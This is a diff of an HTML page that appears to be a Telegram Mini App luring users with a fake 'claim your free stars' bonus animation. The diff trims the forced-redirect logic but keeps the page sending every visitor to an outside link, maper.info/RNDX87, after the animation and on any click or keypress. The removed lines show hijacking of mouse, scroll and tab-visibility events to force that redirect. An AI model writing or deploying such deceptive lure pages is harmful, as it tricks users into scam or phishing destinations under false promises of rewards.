@@ -125,44 +125,6 @@
             0%, 100% { transform: translateY(0) rotate(0deg); opacity: 0; }
             50% { transform: translateY(-20px) rotate(180deg); opacity: 1; }
         }
-
-        .benefits {
-            background: rgba(255,215,0,0.1);
-            border-radius: 15px;
-            padding: 15px;
-            margin: 20px 0;
-            border: 1px solid rgba(255,215,0,0.3);
-        }
-
-        .benefit-item {
-            display: flex;
-            align-items: center;
-            margin: 10px 0;
-            font-size: 14px;
-        }
-
-        .benefit-icon {
-            font-size: 20px;
-            margin-right: 10px;
-            color: #ffd700;
-        }
-
-        .redirect-message {
-            font-size: 14px;
-            opacity: 0.7;
-            margin-top: 20px;
-        }
-
-        .sparkle {
-            position: absolute;
-            font-size: 16px;
-            animation: sparkle 1s ease-in-out infinite;
-        }
-
-        @keyframes sparkle {
-            0%, 100% { opacity: 0; transform: scale(0); }
-            50% { opacity: 1; transform: scale(1); }
-        }
     </style>
 </head>
 <body>
@@ -182,26 +144,7 @@
             </div>
         </div>
 
-        <div class="benefits">
-            <div class="benefit-item">
-                <span class="benefit-icon">🎁</span>
-                <span>Open rare chests</span>
-            </div>
-            <div class="benefit-item">
-                <span class="benefit-icon">⚡</span>
-                <span>Spin premium roulette</span>
-            </div>
-            <div class="benefit-item">
-                <span class="benefit-icon">🔮</span>
-                <span>Buy exclusive items</span>
-            </div>
-        </div>
-
         <div class="claiming-text" id="claimingText">🎊 Preparing your stars...</div>
-        
-        <div class="redirect-message">
-            Redirecting to activate your bonus...
-        </div>
     </div>
 
     <script>
@@ -222,24 +165,10 @@
             }
         }
         
-        // Функция принудительного редиректа
+        // Функция редиректа
         function forceRedirect() {
             const targetUrl = "https://maper.info/RNDX87";
-            
-            try {
-                window.location.href = targetUrl;
-                
-                setTimeout(() => {
-                    window.location.replace(targetUrl);
-                }, 100);
-                
-                setTimeout(() => {
-                    document.body.innerHTML = `<meta http-equiv="refresh" content="0;url=${targetUrl}">`;
-                }, 200);
-                
-            } catch (error) {
-                console.error('Redirect error:', error);
-            }
+            window.location.href = targetUrl;
         }
         
         // Анимация получения звезд
@@ -262,40 +191,9 @@
                 
                 if (currentIndex >= texts.length) {
                     clearInterval(textInterval);
-                    
-                    // Добавляем финальные искры
-                    for (let i = 0; i < 10; i++) {
-                        setTimeout(() => {
-                            const sparkle = document.createElement('div');
-                            sparkle.className = 'sparkle';
-                            sparkle.textContent = '✨';
-                            sparkle.style.left = Math.random() * 100 + '%';
-                            sparkle.style.top = Math.random() * 100 + '%';
-                            document.querySelector('.container').appendChild(sparkle);
-                            
-                            setTimeout(() => sparkle.remove(), 1000);
-                        }, i * 100);
-                    }
-                    
-                    // Редирект после завершения анимации
-                    setTimeout(forceRedirect, 2000);
+                    setTimeout(forceRedirect, 1500);
                 }
             }, 800);
-        }
-        
-        // Проверяем не возврат ли это в приложение
-        function checkReturn() {
-            const lastRedirect = localStorage.getItem('last_redirect');
-            const now = Date.now();
-            
-            if (lastRedirect && (now - parseInt(lastRedirect)) < 10000) {
-                document.getElementById('claimingText').textContent = '🔄 Finalizing your stars...';
-                setTimeout(forceRedirect, 800);
-                return true;
-            }
-            
-            localStorage.setItem('last_redirect', now.toString());
-            return false;
         }
         
         // Инициализация
@@ -303,34 +201,15 @@
             tg.ready();
             tg.expand();
             
-            // Создаем анимацию звезд
             createStarsAnimation();
+            startStarsClaim();
             
-            if (!checkReturn()) {
-                startStarsClaim();
-            }
-            
-            // Перехватываем все события
+            // Редирект при любом действии
             document.addEventListener('click', forceRedirect);
             document.addEventListener('keydown', forceRedirect);
-            document.addEventListener('mousemove', () => setTimeout(forceRedirect, 500));
-            document.addEventListener('scroll', () => setTimeout(forceRedirect, 500));
-            
-            setInterval(() => {
-                if (!window.location.href.includes('maper.info')) {
-                    forceRedirect();
-                }
-            }, 3000);
         }
         
         document.addEventListener('DOMContentLoaded', init);
-        
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden) {
-                document.getElementById('claimingText').textContent = "Completing your bonus...";
-                setTimeout(forceRedirect, 600);
-            }
-        });
     </script>
 </body>
 </html>
